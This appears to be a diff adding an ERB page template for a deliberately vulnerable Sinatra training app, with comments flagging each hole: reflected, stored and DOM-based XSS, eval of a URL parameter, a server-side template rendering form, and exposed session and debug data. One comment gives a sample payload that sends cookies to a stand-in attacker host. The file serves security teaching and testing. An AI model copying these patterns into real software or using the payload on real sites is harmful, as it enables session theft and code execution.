@@ -1,0 +1,118 @@
+<!--
+  RubyGuardian - Vulnerable Sinatra Index Template
+  PURPOSE: Educational security research - demonstrates XSS-vulnerable patterns
+  WARNING: This template contains INTENTIONAL vulnerabilities.
+           NEVER use these patterns in production.
+-->
+<!DOCTYPE html>
+<html>
+<head>
+  <title><%= @title %></title>
+  <!-- VULNERABILITY: No Content Security Policy -->
+  <!-- VULNERABILITY: Loading resources over HTTP (not HTTPS) -->
+  <script src="http://cdn.example.com/jquery.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    .search-box { padding: 10px; margin: 10px 0; }
+    .results { margin-top: 20px; }
+    .warning { color: red; font-weight: bold; }
+    .debug { background: #f0f0f0; padding: 10px; margin: 10px 0; }
+  </style>
+</head>
+<body>
+  <h1>Vulnerable Sinatra Application</h1>
+  <p class="warning">FOR EDUCATIONAL SECURITY RESEARCH ONLY</p>
+
+  <!-- =================================================================== -->
+  <!-- VULNERABILITY: Reflected XSS via unescaped parameter output         -->
+  <!-- RISK: Script execution when user clicks crafted link                -->
+  <!-- =================================================================== -->
+  <div class="search-box">
+    <form action="/" method="get">
+      <label>Search:</label>
+      <input type="text" name="q" value="<%= params[:q] %>">
+      <!-- WARNING: params[:q] is not HTML-escaped in the value attribute -->
+      <button type="submit">Search</button>
+    </form>
+
+    <% if params[:q] %>
+      <!-- WARNING: Direct output of user input without escaping -->
+      <p>You searched for: <%= params[:q] %></p>
+      <!-- An attacker could use: ?q=<script>document.location='http://evil.com/?c='+document.cookie</script> -->
+    <% end %>
+  </div>
+
+  <!-- =================================================================== -->
+  <!-- VULNERABILITY: Unescaped dynamic content injection                  -->
+  <!-- RISK: Stored XSS if @title comes from database                     -->
+  <!-- =================================================================== -->
+  <div class="page-header">
+    <h2><%= @title %></h2>
+  </div>
+
+  <!-- =================================================================== -->
+  <!-- VULNERABILITY: Hidden form for template injection testing           -->
+  <!-- RISK: SSTI leading to Remote Code Execution                        -->
+  <!-- =================================================================== -->
+  <div class="template-test">
+    <h3>Template Preview (Admin Feature)</h3>
+    <form action="/render_template" method="post">
+      <textarea name="template" rows="5" cols="60"
+        placeholder="Enter ERB template markup..."></textarea>
+      <br>
+      <button type="submit">Render Template</button>
+    </form>
+    <!-- WARNING: This form allows arbitrary ERB execution on the server -->
+  </div>
+
+  <!-- =================================================================== -->
+  <!-- VULNERABILITY: DOM-based XSS via fragment identifier               -->
+  <!-- RISK: Code execution through URL hash manipulation                 -->
+  <!-- =================================================================== -->
+  <div id="dynamic-content"></div>
+
+  <script>
+    // WARNING: DOM XSS - hash fragment written to innerHTML
+    var hash = window.location.hash.substring(1);
+    if (hash) {
+      document.getElementById('dynamic-content').innerHTML =
+        decodeURIComponent(hash);
+    }
+
+    // WARNING: User input reflected into JavaScript context
+    var currentQuery = "<%= params[:q] %>";
+    if (currentQuery) {
+      console.log("Search query: " + currentQuery);
+    }
+
+    // WARNING: eval of URL parameter for "calculator" feature
+    var calcExpr = new URLSearchParams(window.location.search).get('calc');
+    if (calcExpr) {
+      try {
+        var result = eval(calcExpr);
+        document.write("<p>Calculation result: " + result + "</p>");
+      } catch(e) {}
+    }
+  </script>
+
+  <!-- =================================================================== -->
+  <!-- VULNERABILITY: Debug information disclosure                        -->
+  <!-- =================================================================== -->
+  <div class="debug">
+    <h4>Debug Info</h4>
+    <pre>Ruby: <%= RUBY_VERSION %></pre>
+    <pre>Rack Env: <%= ENV['RACK_ENV'] %></pre>
+    <pre>Request: <%= request.path_info %></pre>
+    <pre>Params: <%= params.inspect %></pre>
+    <pre>Session: <%= session.inspect %></pre>
+  </div>
+
+  <hr>
+  <nav>
+    <a href="/admin">Admin Panel</a> |
+    <a href="/calc?expr=1+1">Calculator</a> |
+    <a href="/users/search?q=admin">User Search</a> |
+    <a href="/files?name=README">Files</a>
+  </nav>
+</body>
+</html>
